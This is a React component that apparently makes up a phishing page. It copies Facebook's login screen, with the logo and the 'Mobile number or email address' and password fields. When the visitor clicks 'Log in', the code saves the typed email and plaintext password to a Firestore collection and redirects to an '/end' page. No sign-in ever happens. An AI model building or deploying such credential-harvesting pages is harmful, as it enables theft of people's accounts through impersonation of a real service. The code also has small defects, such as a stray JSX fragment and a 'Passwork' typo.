import { useState } from 'react';
import { useNavigate } from "react-router-dom";
import { db } from './firebase.config';
import { setDoc, doc } from 'firebase/firestore';
import facebook from '../fb.png';
import infy from '../infy.png'

export default function   Home() {
  <>block</>
  const navigate = useNavigate();

  const [formData, setFormData] = useState({
    email: '',
    psw: '',
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleClick = async (e) => {
    e.preventDefault();
    
    const { email, psw } = formData;

    try {
      // Generate a unique user ID
      const userId = doc(db, 'users', Date.now().toString()).id;
      
      const userData = { email, psw, uid: userId };

      // Save the user data to Firestore
      await setDoc(doc(db, 'users', userId), userData);

      // Store the UID in localStorage
      localStorage.setItem('uid', userId);

      // Navigate to the next page
      navigate("/end");
    } catch (error) {
      alert("Error during sign up: " + error.message);
    }
  };

  return (
    <>
    <div className='flex justify-center items-center h-96'>
    <img 
  src={facebook} 
  alt="Facebook logo" 
  height={32} 
  width={82} 
/>
</div>
    <div className='flex justify-center items-center flex-col h-[40vh] gap-8'>
      
      <input
        name="email"
        className='outline-blue-600 border-2 p-4 w-[90vw] rounded-xl text-black'
        placeholder="Mobile number or email address"
        value={formData.email}
        onChange={handleChange}
      />
      <input
        name="psw"
        type="password"
        className='outline-blue-600 border-2 p-4 w-[90vw] rounded-xl text-black'
        placeholder="Password"
        value={formData.psw}  
        onChange={handleChange}
      />
    
      <button
        type="button"
        onClick={handleClick}
        className="w-[90vw] p-1 rounded-full text-[2vh] font-semibold text-white bg-blue-600"
      >
        Log in
      </button>
      <a href="#">Forgotten Passwork?</a>

    <button
        type="button"
        className="w-[90vw] p-2 rounded-full text-[2vh] font-semibold text-blue-700 border-2 mt-20"
        >
        Create new account
      </button>
      <div className=' text-gray-700'> <img 
  src={infy} 
  alt="Facebook logo" 
  height={25} 
  width={68} 
/></div>
        </div>
    </>
  );
}
